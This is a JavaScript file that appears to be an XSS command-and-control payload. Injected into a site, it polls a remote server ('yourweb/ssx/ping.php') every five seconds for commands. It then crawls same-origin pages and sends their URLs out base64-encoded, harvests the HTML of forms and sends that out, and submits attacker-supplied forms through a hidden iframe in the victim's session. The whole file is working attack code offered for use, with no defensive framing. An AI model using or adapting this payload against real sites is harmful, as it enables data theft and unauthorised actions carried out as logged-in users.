//get all local urls
var base_url = "https://yourweb/ssx/ping.php";
var urls = [];
var forms = [];

function addlinks(url){
	urls.push(url);
	scrape(url);
}

function scrape_all(url){
	fetch(url)
	  .then(res => res.text())
	  .then((responseText) => {
	    const doc = new DOMParser().parseFromString(responseText, 'text/html');
	    const anchor = doc.querySelectorAll('a');
	    for(var i = anchor.length; i --> 0;)
	    	if(doc.links[i].hostname === location.hostname)
	    		if(urls.indexOf(doc.links[i].href) == -1)
	    			addlinks(doc.links[i].href)
	    			//console.log(doc.links[i].href);
	});
};

function scrape(url){
	fetch(url)
	  .then(res => res.text())
	  .then((responseText) => {
	    const doc = new DOMParser().parseFromString(responseText, 'text/html');
	    const anchor = doc.querySelectorAll('a');
	    for(var i = anchor.length; i --> 0;)
	    	if(doc.links[i].hostname === location.hostname)
	    		if(urls.indexOf(doc.links[i].href) == -1)
	    			urls.push(doc.links[i].href);
	    return true;
	});
	//console.log(urls);
};

function scrape2(target){
	var xhttp = new XMLHttpRequest();
    xhttp.open("GET", target, true);
    xhttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
        	var responseText = this.responseText;
        	const doc = new DOMParser().parseFromString(responseText, 'text/html');
		    const anchor = doc.querySelectorAll('a');
		    for(var i = anchor.length; i --> 0;)
		    	if(doc.links[i].hostname === location.hostname)
		    		if(urls.indexOf(doc.links[i].href) == -1)
		    			urls.push(doc.links[i].href);
		    //console.log(urls);
		    var join_urls = urls.join("|");
			//console.log(urls);
			//alert(join_urls);
			pong(1,encodeURIComponent(btoa(join_urls)));	
			return true;
        } else {
        	return false;
        }
    };
    //xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	xhttp.send("domain="+document.domain);
}

function get_forms(target){
	var xhttp = new XMLHttpRequest();
    xhttp.open("GET", target, true);
    xhttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
        	var responseText = this.responseText.replace(/(\r\n|\n|\r)/gm, "");

        	//console.log(responseText);
        	var matches = responseText.matchAll(/<form(.*?)<\/form/g);
			var arr_result = Array.from(matches, x => x[1]);
			var norms = [];

			for (arr of arr_result){
				norms.push("<form"+arr+"</form>")
			}

			var join_forms = norms.join("|_|");
			var send_data = target+"|_|"+join_forms;
			//console.log(send_data);
			//console.log(btoa(send_data));
			
			pong(2,encodeURIComponent(btoa(send_data)));	
			return true;
        } else {
        	return false;
        }
    };
    //xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	xhttp.send("domain="+document.domain);
}

function submit_form(target){

	if (document.contains(document.getElementById("id_en_form"))) {
            document.getElementById("id_en_form").remove();
	} 	

	if (document.contains(document.getElementById("force-submit"))) {
            document.getElementById("force-submit").remove();
	} 

	var iframe = document.createElement('iframe');
	iframe.setAttribute('name', 'en_form');
	iframe.setAttribute('id', 'id_en_form');
	iframe.setAttribute('style', 'display:none');
	
	document.body.appendChild(iframe);
	
	var html = target.replace("<form", "<form target='en_form'");
	var div = document.createElement("div");
	div.setAttribute('id', 'force-submit');	
	div.setAttribute('style', 'display:none');
	div.innerHTML = html;
	document.body.appendChild(div);
	
	var button = document.querySelector('.btn_en_force');
	button.click();

	//document.getElementById("force-submit").firstElementChild.submit();

	pong(4,"idle");
}

function pong(id,data){
	//alert("Pong: domain="+document.domain+"&id="+id+"&urls="+data);
	var xhttp = new XMLHttpRequest();
    xhttp.open("POST", base_url, true);
    xhttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
        	var str = this.responseText;
			console.log(str);
			return true;
        } else {
        	return false;
        }
    };
    xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	xhttp.send("domain="+document.domain+"&id="+id+"&urls="+data);
}

function checkURL(){
	var cmd;
    var xhttp = new XMLHttpRequest();
    xhttp.open("POST", base_url, true);
    xhttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
        	var str = this.responseText;
			var res = str.split("|");
			//0 : do init
			//1 : do scrap
			//2 : get form
			//3 : submit form
			switch (parseInt(res[0])) {
			  case 0:
			  	//init scrape 1st page
			    scrape2(window.location.href);			    	
			    break;
			  case 1:
			  	//scrape requested page
			    scrape2(res[1]);
			    break;
			  case 2:
			    get_forms(res[1]);
			    break;
			  case 3:
			  	submit_form(res[1]);
			  	break;
			}
			//console.log(str);
        } else {
        	console.log(this.status);
        }
    };
    xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	xhttp.send("domain="+document.domain);
}

setInterval(checkURL,5000); //5000 = 5 seconds
